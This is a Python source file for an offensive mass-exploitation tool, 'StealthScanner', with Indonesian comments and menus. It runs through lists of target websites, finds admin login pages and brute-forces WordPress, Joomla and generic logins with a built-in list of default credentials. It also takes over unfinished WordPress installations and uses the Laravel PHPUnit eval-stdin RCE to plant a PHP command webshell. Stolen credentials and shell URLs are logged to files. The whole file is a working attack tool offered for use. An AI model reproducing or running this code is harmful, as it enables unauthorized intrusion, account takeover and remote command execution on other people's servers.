#!/usr/bin/env python3
"""
StealthScanner v1.0 - Multi-CMS Auto Exploiter
- WordPress Brute Force | Joomla | Laravel | Non-CMS
- Auto Detect File Format | No Duplicate | Validated Login
- SUPER FAST: 50 Threads | 3s Timeout
- 100+ WEAK PASSWORDS for Non-CMS
"""

import requests
import sys
import os
import re
import time
import random
import json
import socket
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
from colorama import init, Fore, Style

init(autoreset=True)

# ==================== KONFIGURASI SUPER CEPAT ====================
MAX_THREADS = 50
TIMEOUT = 5
CHECK_TIMEOUT = 3

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
]

SESSION = requests.Session()
os.makedirs("cache", exist_ok=True)

# File cache
CACHE_FILE = "cache/scanned_targets.json"
WEBSHELL_CACHE = "cache/webshell_cache.json"
CREDS_CACHE = "cache/creds_cache.json"

# Set untuk admin URL (CEK DUPLIKAT)
saved_admin_urls = set()

# Keyword expired (skip)
EXPIRED_KEYWORDS = [
    "domain has expired", "this domain is expired", "domain expired",
    "has been expired", "buy this domain", "domain for sale",
    "parking page", "domain is parked", "namecheap", "godaddy",
    "renew your domain", "looking for a domain", "sedo parking",
]

# Admin login paths
ADMIN_LOGIN_PATHS = [
    '/wp-login.php', '/wp-admin', '/wp-admin/index.php', '/login',
    '/administrator', '/administrator/index.php', '/admin/login',
    '/admin/login.php', '/admin/index.php', '/admin.php', '/admin',
    '/login.php', '/auth/login', '/user/login', '/backend/login',
    '/panel/login', '/cms/login', '/manage/login', '/dashboard/login',
    '/dashboard', '/adminarea', '/adminpanel', '/member/login',
    '/account/login', '/signin', '/logon', '/cpanel', '/cp', '/webmail',
]

# ==================== 100+ WEAK PASSWORDS (NON-CMS) ====================
WEAK_PASSWORDS = [
    # Default credentials (username, password)
    ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
    ('admin', '12345'), ('admin', '123456789'), ('admin', 'root'),
    ('admin', 'toor'), ('admin', 'pass'), ('admin', 'pass123'),
    ('admin', 'admin123'), ('admin', 'admin@123'), ('admin', 'admin!'),
    ('admin', 'Admin'), ('admin', 'ADMIN'), ('admin', 'administrator'),
    ('admin', 'welcome'), ('admin', 'welcome1'), ('admin', 'Welcome1'),
    ('admin', 'qwerty'), ('admin', 'qwerty123'), ('admin', 'Qwerty123'),
    ('admin', 'letmein'), ('admin', 'letmein123'), ('admin', 'login'),
    ('admin', 'default'), ('admin', 'changeme'), ('admin', 'temp'),
    ('admin', 'test'), ('admin', 'test123'), ('admin', 'testing'),
    ('admin', 'demo'), ('admin', 'demo123'), ('admin', 'user'),
    ('admin', 'user123'), ('admin', 'guest'), ('admin', 'secret'),
    ('admin', 'secret123'), ('admin', '123123'), ('admin', '123321'),
    ('admin', '111111'), ('admin', '222222'), ('admin', '333333'),
    ('admin', '1234'), ('admin', '4321'), ('admin', '000000'),
    ('admin', 'abc123'), ('admin', 'abc123!'), ('admin', 'abcd1234'),
    ('admin', 'password123'), ('admin', 'Password123'), ('admin', 'P@ssw0rd'),
    ('admin', 'p@ssword'), ('admin', 'passw0rd'), ('admin', 'Passw0rd'),
    
    # Administrator variants
    ('administrator', 'admin'), ('administrator', 'password'),
    ('administrator', '123456'), ('administrator', 'administrator'),
    ('administrator', 'Administrator'), ('administrator', 'ADMINISTRATOR'),
    ('administrator', 'welcome'), ('administrator', 'qwerty'),
    ('administrator', 'root'), ('administrator', 'toor'),
    
    # Root variants
    ('root', 'root'), ('root', 'toor'), ('root', 'password'),
    ('root', '123456'), ('root', 'admin'), ('root', 'root123'),
    ('root', 'Root'), ('root', 'ROOT'), ('root', 'pass'),
    
    # User variants
    ('user', 'user'), ('user', 'password'), ('user', '123456'),
    ('user', 'user123'), ('user', 'User'), ('user', 'test'),
    ('user', 'guest'), ('user', 'demo'), ('user', 'default'),
    
    # Test variants
    ('test', 'test'), ('test', 'test123'), ('test', 'password'),
    ('test', '123456'), ('test', 'Test'), ('test', 'TEST'),
    ('test', 'demo'), ('test', 'user'),
    
    # Common CMS credentials
    ('wpadmin', 'admin'), ('wpadmin', 'password'), ('wpadmin', '123456'),
    ('wpadmin', 'wpadmin'), ('wpadmin', 'wordpress'),
    ('joomla', 'admin'), ('joomla', 'joomla'), ('joomla', 'password'),
    ('drupal', 'admin'), ('drupal', 'drupal'), ('drupal', 'password'),
    
    # Business/corporate
    ('company', 'company'), ('company', 'admin'), ('company', 'password'),
    ('manager', 'manager'), ('manager', 'admin'), ('manager', 'password'),
    ('support', 'support'), ('support', 'admin'), ('support', 'password'),
    ('info', 'info'), ('info', 'admin'), ('info', 'password'),
    ('sales', 'sales'), ('sales', 'admin'), ('sales', 'password'),
    
    # Generic with numbers
    ('admin', '12345678'), ('admin', '87654321'), ('admin', '11223344'),
    ('admin', '11111111'), ('admin', '12341234'), ('admin', '123123123'),
    ('admin', 'admin123456'), ('admin', 'adminadmin'), ('admin', 'Admin123'),
    ('admin', 'admin2023'), ('admin', 'admin2024'), ('admin', 'admin2025'),
    
    # More common passwords
    ('admin', 'iloveyou'), ('admin', 'freedom'), ('admin', 'whatever'),
    ('admin', 'dragon'), ('admin', 'master'), ('admin', 'shadow'),
    ('admin', 'sunshine'), ('admin', 'superman'), ('admin', 'batman'),
    ('admin', 'spiderman'), ('admin', 'naruto'), ('admin', 'sasuke'),
    ('admin', 'pokemon'), ('admin', 'mario'), ('admin', 'sonic'),
    
    # Keyboard patterns
    ('admin', 'qwertyuiop'), ('admin', 'asdfghjkl'), ('admin', 'zxcvbnm'),
    ('admin', '1qaz2wsx'), ('admin', 'q1w2e3r4'), ('admin', '1q2w3e4r'),
    ('admin', 'zaq1zaq1'), ('admin', '!@#$%^&*'), ('admin', 'qazwsxedc'),
    
    # Year patterns
    ('admin', '2020'), ('admin', '2021'), ('admin', '2022'),
    ('admin', '2023'), ('admin', '2024'), ('admin', '2025'),
    ('admin', '2019'), ('admin', '2018'), ('admin', '2017'),
    
    # Service related
    ('admin', 'cisco'), ('admin', 'router'), ('admin', 'network'),
    ('admin', 'server'), ('admin', 'database'), ('admin', 'backup'),
]

# Webshell minimal
WEBSHELL = """<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);echo"SHELL_OK";}?>"""

# File output
WEBSHELL_LOG = "hasil_webshell.txt"
BRUTEFORCE_LOG = "hasil_bruteforce.txt"
ADMIN_URL_LOG = "hasil_admin_url.txt"
WP_BRUTE_LOG = "hasil_wp_bruteforce.txt"
DOMAIN_DEAD_LOG = "hasil_domain_mati.txt"

# Counter global
total_targets = 0
scanned_count = 0
expired_count = 0
success_count = 0
counter_lock = threading.Lock()

# ==================== ASCII ART BANNER ====================
BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                          ║
║     {Fore.YELLOW}███████ ████████ ███████  █████  ██      ████████ ██   ██ ███████  █████  ███    ██{Fore.CYAN}      ║
║     {Fore.YELLOW}██      ██       ██      ██   ██ ██         ██    ██   ██ ██      ██   ██ ████   ██{Fore.CYAN}      ║
║     {Fore.YELLOW}███████ █████    █████   ███████ ██         ██    ███████ █████   ███████ ██ ██  ██{Fore.CYAN}      ║
║     {Fore.YELLOW}     ██ ██       ██      ██   ██ ██         ██    ██   ██ ██      ██   ██ ██  ██ ██{Fore.CYAN}      ║
║     {Fore.YELLOW}███████ ████████ ███████ ██   ██ ███████    ██    ██   ██ ███████ ██   ██ ██   ████{Fore.CYAN}      ║
║                                                                                          ║
║                    {Fore.YELLOW}StealthScanner v1.0 - Multi-CMS Exploiter{Fore.CYAN}                             ║
║                                                                                          ║
║         {Fore.GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.CYAN}         ║
║         {Fore.GREEN}⚡ 50 Threads | 3s Timeout | 100+ Weak Passwords | Auto Detect{Fore.CYAN}                 ║
║         {Fore.GREEN}🔥 WordPress | Joomla | Laravel | Non-CMS | Shell Upload{Fore.CYAN}                        ║
║                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

# ==================== UTILITY CEPAT ====================
def normalize_url(url):
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')

def get_headers():
    return {'User-Agent': random.choice(USER_AGENTS)}

def is_domain_expired(target):
    """Cek expired - SUPER CEPAT"""
    try:
        domain = target.replace('https://', '').replace('http://', '').split('/')[0]
        try:
            socket.gethostbyname(domain)
        except socket.gaierror:
            return True
        
        resp = SESSION.get(target, timeout=CHECK_TIMEOUT, verify=False, headers=get_headers(), allow_redirects=True)
        text_lower = resp.text.lower()
        
        for keyword in EXPIRED_KEYWORDS:
            if keyword.lower() in text_lower:
                return True
        
        title_match = re.search(r'<title>(.*?)</title>', resp.text, re.IGNORECASE)
        if title_match:
            title = title_match.group(1).lower()
            if any(k in title for k in ['expired', 'parking', 'for sale', 'namecheap']):
                return True
        return False
    except:
        return True

def save_dead_domain(target, reason):
    with open(DOMAIN_DEAD_LOG, 'a') as f:
        f.write(f"{target}\n")

# ==================== LOAD WORDLIST ====================
def load_wordlist(wordlist_file):
    creds = []
    if not wordlist_file or not os.path.exists(wordlist_file):
        return creds
    
    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if ':' in line:
                user, pwd = line.split(':', 1)
                creds.append((user, pwd))
            else:
                for default_user in ['admin', 'administrator', 'root', 'wpadmin']:
                    creds.append((default_user, line))
    return creds

# ==================== VALIDASI LOGIN CEPAT ====================
def test_login_wordpress(login_url, username, password):
    try:
        resp = SESSION.get(login_url, timeout=TIMEOUT, verify=False, headers=get_headers())
        nonce = re.search(r'name="_wpnonce" value="([a-f0-9]+)"', resp.text)
        
        base_domain = '/'.join(login_url.split('/')[:3])
        login_data = {'log': username, 'pwd': password, 'wp-submit': 'Log In',
                      'redirect_to': f"{base_domain}/wp-admin/", 'testcookie': '1'}
        if nonce:
            login_data['_wpnonce'] = nonce.group(1)
        
        login_resp = SESSION.post(login_url, data=login_data, timeout=TIMEOUT, verify=False, headers=get_headers(), allow_redirects=True)
        
        if 'wp-admin' in login_resp.url and 'dashboard' in login_resp.text.lower():
            return True, f"✅ Login success!"
        elif 'wp-admin' in login_resp.url:
            return True, f"✅ Login success!"
    except:
        pass
    return False, ""

def test_login_joomla(target, username, password):
    try:
        login_url = f"{target}/administrator/index.php"
        login_data = {'username': username, 'passwd': password, 'option': 'com_login', 'task': 'login'}
        login_resp = SESSION.post(login_url, data=login_data, timeout=TIMEOUT, verify=False, headers=get_headers(), allow_redirects=True)
        
        if 'cpanel' in login_resp.text.lower() or 'dashboard' in login_resp.text.lower():
            return True, f"✅ Joomla login!"
    except:
        pass
    return False, ""

def test_login_generic(target, username, password, login_path):
    try:
        login_url = urljoin(target, login_path)
        forms = [
            {'username': username, 'password': password, 'login': 'Login'},
            {'user': username, 'pass': password, 'submit': 'Login'},
            {'log': username, 'pwd': password, 'wp-submit': 'Log In'},
            {'email': username, 'password': password, 'login': 'Sign In'},
            {'user_login': username, 'user_password': password, 'wp-submit': 'Log In'},
        ]
        
        for form_data in forms:
            try:
                login_resp = SESSION.post(login_url, data=form_data, timeout=TIMEOUT, verify=False, headers=get_headers(), allow_redirects=True)
                if any(i in login_resp.text.lower() for i in ['dashboard', 'admin panel', 'welcome', 'home', 'index']):
                    return True, f"✅ Login at {login_path}"
            except:
                continue
    except:
        pass
    return False, ""

# ==================== VALIDASI WEBSHELL ====================
def test_webshell_valid(shell_url):
    try:
        resp = requests.get(f"{shell_url}?cmd=echo OK", timeout=5, verify=False, headers=get_headers())
        if 'SHELL_OK' in resp.text or 'OK' in resp.text:
            return True, "Shell OK"
    except:
        pass
    return False, ""

# ==================== CACHE ====================
def load_cache():
    cache = {"scanned": {}}
    if os.path.exists(CACHE_FILE):
        try:
            with open(CACHE_FILE, 'r') as f:
                cache["scanned"] = json.load(f)
        except:
            pass
    return cache

def save_scanned_cache(target):
    cache = load_cache()
    cache["scanned"][target] = {"time": time.strftime("%Y-%m-%d %H:%M:%S")}
    with open(CACHE_FILE, 'w') as f:
        json.dump(cache["scanned"], f, indent=2)

def is_target_scanned(target):
    cache = load_cache()
    return target in cache["scanned"]

def save_credential(target, username, password, msg, source=""):
    if os.path.exists(BRUTEFORCE_LOG):
        with open(BRUTEFORCE_LOG, 'r') as f:
            if f"{target}\nuser : {username}\npass : {password}" in f.read():
                return
    with open(BRUTEFORCE_LOG, 'a') as f:
        f.write(f"{target}\n")
        f.write(f"user : {username}\n")
        f.write(f"pass : {password}\n")
        f.write(f"source : {source}\n")
        f.write(f"{'-'*30}\n")

def save_webshell(target, shell_url, exploit, msg):
    with open(WEBSHELL_LOG, 'a') as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {target}\n")
        f.write(f"  Exploit: {exploit}\n")
        f.write(f"  Shell: {shell_url}?cmd=whoami\n")
        f.write(f"  Validation: {msg}\n")
        f.write(f"{'='*50}\n")

def save_admin_url(target, admin_url):
    global saved_admin_urls
    key = f"{target} | {admin_url}"
    if key in saved_admin_urls:
        return
    saved_admin_urls.add(key)
    with open(ADMIN_URL_LOG, 'a') as f:
        f.write(f"{target} | {admin_url}\n")

def save_wp_brute_result(target, login_url, username, password, msg):
    if os.path.exists(WP_BRUTE_LOG):
        with open(WP_BRUTE_LOG, 'r') as f:
            if f"{target}\nuser : {username}\npass : {password}" in f.read():
                return
    with open(WP_BRUTE_LOG, 'a') as f:
        f.write(f"{target}\n")
        f.write(f"login_url : {login_url}\n")
        f.write(f"user : {username}\n")
        f.write(f"pass : {password}\n")
        f.write(f"{'-'*30}\n")

# ==================== DETEKSI CMS CEPAT ====================
def detect_cms(target):
    try:
        resp = SESSION.get(target, timeout=CHECK_TIMEOUT, verify=False, headers=get_headers())
        text = resp.text.lower()
        if 'wp-content' in text or 'wordpress' in text:
            return 'wordpress'
        elif 'joomla' in text or 'media/system/js' in text:
            return 'joomla'
        elif 'laravel' in text or 'csrf-token' in text:
            return 'laravel'
        return 'unknown'
    except:
        return 'unknown'

# ==================== FIND ADMIN URL CEPAT ====================
def find_admin_login_urls(target, cms):
    if cms == 'wordpress':
        paths = ['/wp-login.php', '/wp-admin']
    elif cms == 'joomla':
        paths = ['/administrator', '/administrator/index.php']
    elif cms == 'laravel':
        paths = ['/login', '/admin/login']
    else:
        paths = ADMIN_LOGIN_PATHS
    
    found_urls = []
    for path in paths[:5]:
        try:
            full_url = urljoin(target, path)
            resp = SESSION.get(full_url, timeout=2, verify=False, headers=get_headers(), allow_redirects=True)
            if resp.status_code == 200:
                if any(i in resp.text.lower() for i in ['login', 'username', 'password']):
                    if '404' not in resp.text.lower():
                        found_urls.append((path, full_url))
                        save_admin_url(target, full_url)
        except:
            continue
    return found_urls

# ==================== WORDPRESS BRUTE FORCE ====================
def wordpress_bruteforce_target(target, login_url, wordlist_file):
    creds = load_wordlist(wordlist_file)
    if not creds:
        return False
    
    for username, password in creds[:50]:
        try:
            valid, msg = test_login_wordpress(login_url, username, password)
            if valid:
                save_credential(target, username, password, msg, "WP Brute")
                save_wp_brute_result(target, login_url, username, password, msg)
                print(f"    {Fore.GREEN}[SUCCESS] {username}:{password}{Style.RESET_ALL}")
                return True
        except:
            continue
    return False

# ==================== WP-INSTALL EXPLOIT ====================
def wp_install_exploit(target):
    try:
        install_url = f"{target}/wp-admin/install.php"
        resp = SESSION.get(install_url, timeout=TIMEOUT, verify=False, headers=get_headers())
        if resp.status_code == 200 and 'WordPress Installation' in resp.text:
            admin_user = f"adm_{random.randint(100,999)}"
            admin_pass = f"WP@{random.randint(1000,9999)}!py"
            
            data = {
                'weblog_title': f'pyscan_{int(time.time())}',
                'user_name': admin_user,
                'admin_email': f"{admin_user}@test.com",
                'admin_password': admin_pass,
                'admin_password2': admin_pass,
                'pw_weak': 'on',
                'Submit': 'Install WordPress',
            }
            
            install_resp = SESSION.post(install_url, data=data, timeout=TIMEOUT, verify=False, headers=get_headers())
            if 'Success' in install_resp.text:
                valid, _ = test_login_wordpress(f"{target}/wp-login.php", admin_user, admin_pass)
                if valid:
                    save_credential(target, admin_user, admin_pass, "WP-Install success", "WP-Install")
                    print(f"    {Fore.GREEN}[SUCCESS] WP-Install - {admin_user}:{admin_pass}{Style.RESET_ALL}")
                    return True
    except:
        pass
    return False

# ==================== JOOMLA BRUTE FORCE ====================
def joomla_bruteforce(target, wordlist_file):
    creds = load_wordlist(wordlist_file)
    if not creds:
        return False
    
    try:
        login_url = f"{target}/administrator/index.php"
        for username, password in creds[:30]:
            data = {'username': username, 'passwd': password, 'option': 'com_login', 'task': 'login'}
            resp = SESSION.post(login_url, data=data, timeout=TIMEOUT, verify=False, headers=get_headers(), allow_redirects=True)
            if 'cpanel' in resp.text.lower() or 'dashboard' in resp.text.lower():
                valid, _ = test_login_joomla(target, username, password)
                if valid:
                    save_credential(target, username, password, "Joomla success", "Joomla Brute")
                    print(f"    {Fore.GREEN}[SUCCESS] Joomla - {username}:{password}{Style.RESET_ALL}")
                    return True
    except:
        pass
    return False

# ==================== LARAVEL PHPUNIT RCE ====================
def laravel_phpunit_rce(target):
    try:
        test_url = f"{target}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        test_resp = SESSION.post(test_url, data='<?php echo "TEST";', timeout=3, verify=False, headers=get_headers())
        if test_resp.status_code == 200 and 'TEST' in test_resp.text:
            SESSION.post(test_url, data=WEBSHELL, timeout=TIMEOUT, verify=False, headers=get_headers())
            valid, _ = test_webshell_valid(test_url)
            if valid:
                save_webshell(target, test_url, "Laravel PHPUnit RCE", "Shell OK")
                print(f"    {Fore.GREEN}[SUCCESS] Laravel PHPUnit RCE - Shell: {test_url}?cmd=whoami{Style.RESET_ALL}")
                return True
    except:
        pass
    return False

# ==================== WEAK PASSWORD BYPASS (100+ PASSWORDS) ====================
def weak_password_bypass(target, admin_urls):
    """Coba 100+ weak password untuk NON-CMS bypass"""
    if not admin_urls:
        return False
    
    print(f"    {Fore.CYAN}[*] Trying {len(WEAK_PASSWORDS)} weak passwords...{Style.RESET_ALL}")
    
    for login_path, full_url in admin_urls[:3]:
        for username, password in WEAK_PASSWORDS:
            try:
                forms = [
                    {'username': username, 'password': password, 'login': 'Login'},
                    {'user': username, 'pass': password, 'submit': 'Login'},
                    {'log': username, 'pwd': password, 'wp-submit': 'Log In'},
                    {'email': username, 'password': password, 'login': 'Sign In'},
                    {'user_login': username, 'user_password': password, 'wp-submit': 'Log In'},
                ]
                for form_data in forms:
                    try:
                        login_resp = SESSION.post(full_url, data=form_data, timeout=TIMEOUT, verify=False, headers=get_headers(), allow_redirects=True)
                        if any(i in login_resp.text.lower() for i in ['dashboard', 'admin panel', 'welcome', 'home', 'index', 'main']):
                            save_credential(target, username, password, f"Login at {login_path}", "Weak Password")
                            print(f"    {Fore.GREEN}[SUCCESS] Weak Password - {username}:{password}{Style.RESET_ALL}")
                            print(f"    {Fore.CYAN}   Admin URL: {login_path}{Style.RESET_ALL}")
                            return True
                    except:
                        continue
            except:
                continue
    return False

# ==================== SCAN SATU TARGET CEPAT ====================
def scan_target(target, wordlist_file=None):
    global scanned_count, expired_count, success_count
    
    with counter_lock:
        scanned_count += 1
        current = scanned_count
    
    # Cek expired
    if is_domain_expired(target):
        with counter_lock:
            expired_count += 1
        print(f"{Fore.RED}[{current}/{total_targets}] ✗ EXPIRED: {target[:60]}{Style.RESET_ALL}")
        save_dead_domain(target, "expired")
        return
    
    if is_target_scanned(target):
        return
    
    print(f"{Fore.CYAN}[{current}/{total_targets}] [▶] {target[:60]}{Style.RESET_ALL}")
    
    # Deteksi CMS
    cms = detect_cms(target)
    print(f"    {Fore.CYAN}📌 CMS: {cms.upper()}{Style.RESET_ALL}")
    
    # Cari admin URLs
    admin_urls = find_admin_login_urls(target, cms)
    if admin_urls:
        print(f"    {Fore.GREEN}✓ Found {len(admin_urls)} admin URL(s){Style.RESET_ALL}")
        for path, url in admin_urls[:2]:
            print(f"      {Fore.CYAN}→ {path}{Style.RESET_ALL}")
    else:
        print(f"    {Fore.RED}✗ No admin URL found{Style.RESET_ALL}")
        save_scanned_cache(target)
        return
    
    exploit_success = False
    
    # WordPress
    if cms == 'wordpress':
        if wp_install_exploit(target):
            exploit_success = True
        
        if not exploit_success and wordlist_file:
            wp_login_urls = [url for path, url in admin_urls if 'wp-login' in path]
            if wp_login_urls:
                if wordpress_bruteforce_target(target, wp_login_urls[0], wordlist_file):
                    exploit_success = True
        
        if not exploit_success:
            if weak_password_bypass(target, admin_urls):
                exploit_success = True
    
    # Joomla
    elif cms == 'joomla':
        if wordlist_file:
            if joomla_bruteforce(target, wordlist_file):
                exploit_success = True
        
        if not exploit_success:
            if weak_password_bypass(target, admin_urls):
                exploit_success = True
    
    # Laravel
    elif cms == 'laravel':
        if laravel_phpunit_rce(target):
            exploit_success = True
        
        if not exploit_success:
            if weak_password_bypass(target, admin_urls):
                exploit_success = True
    
    # Unknown
    else:
        if weak_password_bypass(target, admin_urls):
            exploit_success = True
    
    if exploit_success:
        with counter_lock:
            success_count += 1
    else:
        print(f"    {Fore.RED}[SAFE] No vulnerabilities found{Style.RESET_ALL}")
    
    save_scanned_cache(target)

# ==================== SCAN DARI FILE (AUTO DETECT) ====================
def scan_from_file_auto(filepath, wordlist_file=None):
    global total_targets, scanned_count, expired_count, success_count
    
    if not os.path.exists(filepath):
        print(f"{Fore.RED}[!] File '{filepath}' tidak ditemukan!")
        return
    
    # Reset counters
    scanned_count = 0
    expired_count = 0
    success_count = 0
    
    # Baca file
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    # Deteksi format dan ekstrak targets
    targets = []
    if any('|' in line for line in lines):
        for line in lines:
            if '|' in line:
                parts = line.split('|')
                domain = parts[0].strip()
                targets.append(domain)
    else:
        targets = lines
    
    # Hapus duplikat
    targets = list(dict.fromkeys(targets))
    total_targets = len(targets)
    
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.YELLOW}🚀 STEALTHSCANNER v1.0 - SUPER FAST SCAN")
    print(f"{Fore.CYAN}{'='*70}")
    print(f"{Fore.GREEN}📁 File: {filepath}")
    print(f"{Fore.GREEN}📊 Total targets: {total_targets}")
    print(f"{Fore.GREEN}⚡ Threads: {MAX_THREADS} | Timeout: {TIMEOUT}s")
    if wordlist_file and os.path.exists(wordlist_file):
        print(f"{Fore.GREEN}📁 Wordlist: {wordlist_file}")
    print(f"{Fore.GREEN}🔑 Weak passwords: {len(WEAK_PASSWORDS)}")
    print(f"{Fore.CYAN}{'='*70}\n")
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(scan_target, t, wordlist_file): t for t in targets}
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    elapsed = time.time() - start_time
    
    # Summary
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.YELLOW}📊 SCAN SUMMARY")
    print(f"{Fore.CYAN}{'='*70}")
    print(f"{Fore.GREEN}✓ Total targets: {total_targets}")
    print(f"{Fore.RED}✗ Expired/Dead: {expired_count}")
    print(f"{Fore.GREEN}✓ Active scanned: {scanned_count - expired_count}")
    print(f"{Fore.GREEN}✓ Successful logins: {success_count}")
    print(f"{Fore.CYAN}⏱️  Time: {elapsed:.1f} seconds")
    print(f"{Fore.CYAN}{'='*70}")

def scan_single_target(target, wordlist_file=None):
    global total_targets, scanned_count
    
    target = normalize_url(target)
    total_targets = 1
    scanned_count = 0
    
    expired, _ = is_domain_expired(target)
    if expired:
        print(f"{Fore.RED}✗ Domain expired/mati{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.CYAN}[▶] {Fore.WHITE}{target}{Style.RESET_ALL}")
    
    cms = detect_cms(target)
    print(f"    {Fore.CYAN}📌 CMS: {cms.upper()}{Style.RESET_ALL}")
    
    admin_urls = find_admin_login_urls(target, cms)
    if admin_urls:
        print(f"    {Fore.GREEN}✓ Found {len(admin_urls)} admin URL(s){Style.RESET_ALL}")
        for path, url in admin_urls[:3]:
            print(f"      {Fore.CYAN}→ {path}{Style.RESET_ALL}")
    else:
        print(f"    {Fore.RED}✗ No admin URL found{Style.RESET_ALL}")
        return
    
    exploit_success = False
    
    if cms == 'wordpress':
        if wp_install_exploit(target):
            exploit_success = True
        
        if not exploit_success and wordlist_file:
            wp_login_urls = [url for path, url in admin_urls if 'wp-login' in path]
            if wp_login_urls and wordpress_bruteforce_target(target, wp_login_urls[0], wordlist_file):
                exploit_success = True
        
        if not exploit_success and weak_password_bypass(target, admin_urls):
            exploit_success = True
    
    elif cms == 'joomla':
        if wordlist_file and joomla_bruteforce(target, wordlist_file):
            exploit_success = True
        elif weak_password_bypass(target, admin_urls):
            exploit_success = True
    
    elif cms == 'laravel':
        if laravel_phpunit_rce(target):
            exploit_success = True
        elif weak_password_bypass(target, admin_urls):
            exploit_success = True
    
    else:
        if weak_password_bypass(target, admin_urls):
            exploit_success = True
    
    if not exploit_success:
        print(f"    {Fore.RED}[SAFE] No vulnerabilities found{Style.RESET_ALL}")

def view_file(filename, title):
    print(f"\n{Fore.CYAN}{'='*50}")
    print(f"{Fore.YELLOW}{title}")
    print(f"{Fore.CYAN}{'='*50}")
    if os.path.exists(filename) and os.path.getsize(filename) > 0:
        with open(filename, 'r') as f:
            print(f.read())
    else:
        print(f"{Fore.RED}Empty")

def clear_cache():
    global saved_admin_urls
    cache_files = [CACHE_FILE, WEBSHELL_CACHE, CREDS_CACHE]
    for cf in cache_files:
        if os.path.exists(cf):
            os.remove(cf)
    saved_admin_urls.clear()
    print(f"{Fore.GREEN}✓ Cache cleared!{Style.RESET_ALL}")

# ==================== MENU ====================
def menu():
    print(BANNER)
    print(f"""
{Fore.YELLOW}╔══════════════════════════════════════════════════════════════════════════════════╗
║                              {Fore.WHITE}MENU UTAMA{Fore.YELLOW}                                                   ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  {Fore.CYAN}[1]{Fore.WHITE} SCAN dari file (AUTO DETECT: domain list atau domain biasa)                         ║
║  {Fore.CYAN}[2]{Fore.WHITE} Scan satu target                                                                   ║
║  {Fore.CYAN}[3]{Fore.WHITE} Lihat hasil webshell ({WEBSHELL_LOG})                                             ║
║  {Fore.CYAN}[4]{Fore.WHITE} Lihat hasil credentials ({BRUTEFORCE_LOG})                                        ║
║  {Fore.CYAN}[5]{Fore.WHITE} Lihat admin URL yang ditemukan ({ADMIN_URL_LOG})                                  ║
║  {Fore.CYAN}[6]{Fore.WHITE} Lihat hasil WP Brute Force ({WP_BRUTE_LOG})                                       ║
║  {Fore.CYAN}[7]{Fore.WHITE} Lihat domain expired/mati ({DOMAIN_DEAD_LOG})                                     ║
║  {Fore.CYAN}[8]{Fore.WHITE} Hapus cache                                                                        ║
║  {Fore.CYAN}[9]{Fore.WHITE} Keluar                                                                             ║
╚══════════════════════════════════════════════════════════════════════════════════╝
    """)

def main():
    import urllib3
    urllib3.disable_warnings()
    
    while True:
        menu()
        choice = input(f"{Fore.WHITE}Pilih (1-9): ").strip()
        
        if choice == "1":
            filepath = input("File targets: ").strip()
            if not filepath:
                continue
            wf = input("File wordlist (Enter jika tidak): ").strip()
            if not wf or not os.path.exists(wf):
                wf = None
            scan_from_file_auto(filepath, wf)
            input("\nTekan Enter...")
        
        elif choice == "2":
            target = input("URL target: ").strip()
            if not target:
                continue
            wf = input("File wordlist (Enter jika tidak): ").strip()
            if not wf or not os.path.exists(wf):
                wf = None
            scan_single_target(target, wf)
            input("\nTekan Enter...")
        
        elif choice == "3":
            view_file(WEBSHELL_LOG, "📁 WEBSHELL RESULTS")
            input("\nTekan Enter...")
        
        elif choice == "4":
            view_file(BRUTEFORCE_LOG, "📁 CREDENTIALS RESULTS")
            input("\nTekan Enter...")
        
        elif choice == "5":
            view_file(ADMIN_URL_LOG, "📁 ADMIN URLS FOUND")
            input("\nTekan Enter...")
        
        elif choice == "6":
            view_file(WP_BRUTE_LOG, "📁 WP BRUTE FORCE RESULTS")
            input("\nTekan Enter...")
        
        elif choice == "7":
            view_file(DOMAIN_DEAD_LOG, "📁 DOMAIN EXPIRED/MATI")
            input("\nTekan Enter...")
        
        elif choice == "8":
            clear_cache()
            input("\nTekan Enter...")
        
        elif choice == "9":
            print(f"{Fore.GREEN}Thank you for using StealthScanner!{Style.RESET_ALL}")
            sys.exit(0)

if __name__ == "__main__":
    main()